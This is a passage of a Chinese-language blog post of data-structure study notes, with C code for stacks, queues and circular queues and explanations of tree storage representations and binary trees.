class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdlib.h&quot;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">StackNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;StackNode, * LinkStackPtr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LinkStackPtr top;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">&#125;LinkStack;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitLinkStack</span><span class="params">(LinkStack *ls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ls-&gt;count = <span class="number">0</span>;</span><br><span class="line">    ls-&gt;top = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(LinkStack* ls, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkStackPtr p;</span><br><span class="line">    p = (LinkStackPtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(StackNode));</span><br><span class="line">    p-&gt;data = num;</span><br><span class="line">    p-&gt;next = ls-&gt;top;</span><br><span class="line">    ls-&gt;top = p;</span><br><span class="line">    ls-&gt;count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(LinkStack* ls, <span class="keyword">int</span> *num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkStackPtr p;</span><br><span class="line"></span><br><span class="line">    *num = ls-&gt;top-&gt;data;</span><br><span class="line">    p = ls-&gt;top;</span><br><span class="line">    ls-&gt;top = ls-&gt;top-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    ls-&gt;count--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putLinkStack</span><span class="params">(LinkStack* ls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    LinkStackPtr p;</span><br><span class="line">    p = ls-&gt;top;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ls-&gt;count;i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeLinkStack</span><span class="params">(LinkStack* ls)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkStackPtr p,q;</span><br><span class="line">    p = ls-&gt;top;</span><br><span class="line">    <span class="keyword">while</span> (p)</span><br><span class="line">    &#123;</span><br><span class="line">        q = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        p = q;</span><br><span class="line">    &#125;</span><br><span class="line">    ls-&gt;count = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkStack linkstack;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    InitLinkStack(&amp;linkstack);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        push(&amp;linkstack, i);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    putLinkStack(&amp;linkstack);</span><br><span class="line"></span><br><span class="line">    pop(&amp;linkstack, &amp;num);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%d\n&quot;</span>, num);</span><br><span class="line">    putLinkStack(&amp;linkstack);</span><br><span class="line">    freeLinkStack(&amp;linkstack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="栈应用-递归"><a href="#栈应用-递归" class="headerlink" title="栈应用-递归"></a>栈应用-递归</h4><p>经典的斐波那契数列，也是走楼梯。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(num&lt;<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(num==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(num==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fun(num<span class="number">-1</span>)+fun(num<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line">num=fun(<span class="number">5</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有就是四则运算用栈来实验，特别是如何利用栈来计算后缀表达式，和如何将中缀表达式转为后缀表达式，确实想出这个的人非常厉害，后面可以考虑实现一下。</p><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>先进先出</p><h4 id="普通队列"><a href="#普通队列" class="headerlink" title="普通队列"></a>普通队列</h4><p>用一个数组来来创造队列，数组头作为对头，要插入数据就顺着数组插，要删除数据就从数组头开始删，这样的结构会导致删除后的数组头部分空间无法再次使用，所以就有了循环队列。</p><h4 id="循环队列"><a href="#循环队列" class="headerlink" title="循环队列"></a>循环队列</h4><p>使用head来标记头下标，用last来标记尾的下一个下标，为避免队列空和对列满的条件判断重合，故意让对列满时空一个元素，使对列满的条件改变。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> data[max];</span><br><span class="line"><span class="keyword">int</span> head;</span><br><span class="line"><span class="keyword">int</span> last;<span class="comment">//代表放入数据的后一个下标</span></span><br><span class="line">&#125;Queue;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initQueue</span><span class="params">(Queue *Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//当head==last就代表队列空</span></span><br><span class="line">Q-&gt;head = <span class="number">0</span>;</span><br><span class="line">Q-&gt;last = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(Queue* Q,<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((Q-&gt;last + <span class="number">1</span>) % max == Q-&gt;head)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;对列满了\n&quot;</span>);<span class="comment">//实际上为了让对列满和对列空的条件不一样，让对列实际上还空了一个。</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">Q-&gt;data[Q-&gt;last] = num;</span><br><span class="line">Q-&gt;last=(Q-&gt;last+<span class="number">1</span>)%max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(Queue* Q, <span class="keyword">int</span>* num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;head == Q-&gt;last)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;对列空\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">*num = Q-&gt;data[Q-&gt;head];</span><br><span class="line">Q-&gt;head = (Q-&gt;head + <span class="number">1</span>) % max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getlen</span><span class="params">(Queue* Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (Q-&gt;last - Q-&gt;head + max) % max;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">putQueue</span><span class="params">(Queue Q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,index;</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line">len = getlen(&amp;Q);</span><br><span class="line"><span class="keyword">if</span> (len == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;队列为空\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">index = Q.head;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, Q.data[index]);</span><br><span class="line">index = (index + <span class="number">1</span>) % max;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Queue Q;</span><br><span class="line"><span class="keyword">int</span> i, num;</span><br><span class="line">initQueue(&amp;Q);</span><br><span class="line">putQueue(Q);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">push(&amp;Q, i);</span><br><span class="line">&#125;</span><br><span class="line">pop(&amp;Q, &amp;num);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, num);</span><br><span class="line">putQueue(Q);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="用链表来实现对列"><a href="#用链表来实现对列" class="headerlink" title="用链表来实现对列"></a>用链表来实现对列</h4><p>就是链表，用尾插来实现插入新元素，然后头删。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">QNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;QNode,* QNodePtr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">QNodePtr head;</span><br><span class="line">QNodePtr last;</span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initLinkQueue</span><span class="params">(LinkQueue* LQ)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LQ-&gt;head = LQ-&gt;last= (QNodePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));</span><br><span class="line">LQ-&gt;head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(LinkQueue* LQ, <span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">QNodePtr p = (QNodePtr)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(QNode));</span><br><span class="line">p-&gt;data = num;</span><br><span class="line">p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">LQ-&gt;last-&gt;next = p;</span><br><span class="line">LQ-&gt;last = p;<span class="comment">//更新队列尾</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(LinkQueue* LQ, <span class="keyword">int</span>* num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (LQ-&gt;head == LQ-&gt;last)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;队列空&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">QNodePtr p, q;</span><br><span class="line">q = LQ-&gt;head-&gt;next;</span><br><span class="line">*num = q-&gt;data;</span><br><span class="line">LQ-&gt;head-&gt;next = q-&gt;next;</span><br><span class="line"><span class="keyword">if</span> (q == LQ-&gt;last)<span class="comment">//如果是最后一个要重新初始化为空队列</span></span><br><span class="line">&#123;</span><br><span class="line">LQ-&gt;last = LQ-&gt;head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(q);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LinkQueue LQ;</span><br><span class="line"><span class="keyword">int</span> i, num;</span><br><span class="line"></span><br><span class="line">initLinkQueue(&amp;LQ);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">push(&amp;LQ, i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)<span class="comment">//故意设置了6，看会不会判定为空队列。</span></span><br><span class="line">&#123;</span><br><span class="line">pop(&amp;LQ,&amp;num);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="树"><a href="#树" class="headerlink" title="树"></a>树</h3><h4 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h4><p><strong>树的定义</strong>：树(Tree)是n(n≥0）个结点的有限集。n=0时称为空树。在任意一棵非空树中:(1)有且仅有一个特定的称为根(Root)的结点;(2)当n&gt;1时,其余结点可分为m (m&gt;0)个互不相交的有限集T1、T2、……、Tm,其中每一个集合本身又是一棵树,并且称为根的子树(SubTree )。</p><p><strong>结点的度</strong>：结点拥有的子树数称为结点的度。度为0的结点称为叶节点或终端结点，就是尽头。度不为0的结点称为非终端结点或分支结点。</p><p><strong>树的度</strong>：树的度就算是树内各结点的度的最大值。</p><p><strong>结点关系</strong>：孩子，双亲，兄弟，堂兄。</p><p><strong>树的深度或高度</strong>：从根开始定义起，根为第一层，根的孩子为第二层，最大层就是深度。</p><p><strong>有序树和无序数</strong>：如果结点的子树左右不能变换，就是有序树，否则为无序树。</p><h4 id="树的存储结构"><a href="#树的存储结构" class="headerlink" title="树的存储结构"></a>树的存储结构</h4><p>由于树是1对多的关系，简单的顺序存储结构无法满足对树的要求，但是充分利用顺序存储和链式存储结构特点，就可以实现树的存储结构的表示。主要3种表示法：双亲表示法，孩子表示法，孩子兄弟表示法。</p><p>例子<br><img src="https://i.loli.net/2021/08/08/MzgjTwlFk7cad4V.png"><br>1.双亲表示法</p><p>树的结构保证了除了根结点以外的所有结点，都会有双亲，所以我们可以定义下面的结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PTNode</span>//结点结构</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;<span class="comment">//结点数据</span></span><br><span class="line"><span class="keyword">int</span> parent;<span class="comment">//双亲位置</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> //树结构</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">PTNode nodes[max];</span><br><span class="line"><span class="keyword">int</span> r,n;<span class="comment">//根的位置和结点数</span></span><br><span class="line">&#125;PTree</span><br></pre></td></tr></table></figure><p>根的parent就设置为-1，这样我们就可以通过任意结点找到其双亲。但是如果我们要找结点的孩子，就必须遍历整个结构。为解决这种情况，就可以在PTNode中添加一个firstchild，用来储存孩子的的下标，如果是叶节点，就将值设为-1。变成下面这种结构<br><img src="https://i.loli.net/2021/08/07/csWTPgdXi1FYMyA.png"></p><p>2.孩子表示法</p><p>方案一：</p><p>采用多重链表表示法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line"><span class="keyword">int</span> degree;<span class="comment">//结点的孩子有几个</span></span><br><span class="line">Cboxptr box[degree];<span class="comment">//定义一个指针数组，数组内每个元素都指向子结点。</span></span><br><span class="line">&#125;Cbox,*Cboxptr;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/07/H7WnDIzdqZcktQb.png"><br>这种倒是节省空间，但是也存在着问题，就是每一个结点都可能是不同的，无论是数据还是子结点个数。所以会导致运算上带来时间的损耗。于是就有了方案二。</p><p>方案二：</p><p>采用顺序储存结构和单链表相结合，将结点先用双亲表示法的顺序储存结构表示出来，然后添加一个指向第一个子结点的指针类型，所有子结点以单链表方式串起来。如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> child;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CTNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;*ChildPtr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line">ChildPtr firstchild;</span><br><span class="line">&#125;CTBox;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">CTBox nodes[max];</span><br><span class="line"><span class="keyword">int</span> r,n;</span><br><span class="line">&#125;CTree;</span><br></pre></td></tr></table></figure><p>如果想要体验孩子的双亲，可以在CTbox结构中再添加parent变量，存储parent的下标，这种就算是双亲表示法的改进。<br><img src="https://i.loli.net/2021/08/08/xiUFdaSOXmKYL1w.png"></p><p>3.兄弟孩子表示法。</p><p>对于一个结点，如果其有子结点，那么第一个子结点就是唯一的，如果子结点有右兄弟，那么右兄弟也是唯一的。就可以定义出下面的结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">CSNode</span> *<span class="title">firstchild</span>,*<span class="title">rightsib</span>;</span></span><br><span class="line">&#125;CSNode,*CSTree;</span><br></pre></td></tr></table></figure><p>得到如下结构<br><img src="https://i.loli.net/2021/08/08/qbf4LG5WX8znJOh.png"><br>这样定义就可以将所有树转化为二叉树，用二叉树的特点来解决问题。</p><h4 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h4><p>通俗来讲就是最多只能有两个叉，而且左叉和右叉是不一样的。</p><p>然后主要是满二叉树和完全二叉树</p><p><strong>满二叉树</strong>：除了叶结点，其他结点都有两个叉，叶只能在最下一层，对称。</p><p><strong>完全二叉树</strong>：将二叉树写满编号，填满为满二叉树，编号顺序不能断。叶可在最下一层和倒数第二层，最底层的叶一定在左边。</p><p><strong>二叉树性质</strong>：<a href="http://data.biancheng.net/view/192.html#:~:text=%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%80%A7%E8%B4%A8%20%E7%BB%8F%E8%BF%87%E5%89%8D%E4%BA%BA%E7%9A%84%E6%80%BB%E7%BB%93%EF%BC%8C%E4%BA%8C%E5%8F%89%E6%A0%91%E5%85%B7%E6%9C%89%E4%BB%A5%E4%B8%8B%E5%87%A0%E4%B8%AA%E6%80%A7%E8%B4%A8%EF%BC%9A%20%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%EF%BC%8C%E7%AC%AC%20i%20%E5%B1%82%E6%9C%80%E5%A4%9A%E6%9C%89%202%20i-1%20%E4%B8%AA%E7%BB%93%E7%82%B9%E3%80%82,%E7%9A%84%E7%BB%93%E7%82%B9%E6%95%B0%E4%B8%BA%20n%202%EF%BC%8C%E5%88%99%20n%200%20%3Dn%202%20%2B1%E3%80%82">二叉树性质</a></p><h4 id="遍历二叉树"><a href="#遍历二叉树" class="headerlink" title="遍历二叉树"></a>遍历二叉树</h4><p>有很多遍历二叉树的方法</p><p>1.前序遍历</p><p>规则是若二叉树为空，则空操作返回，否则先访问根结点,然后前序遍历左子树，再前序遍历右子树。这种就是左子树优先级最高。<br><img 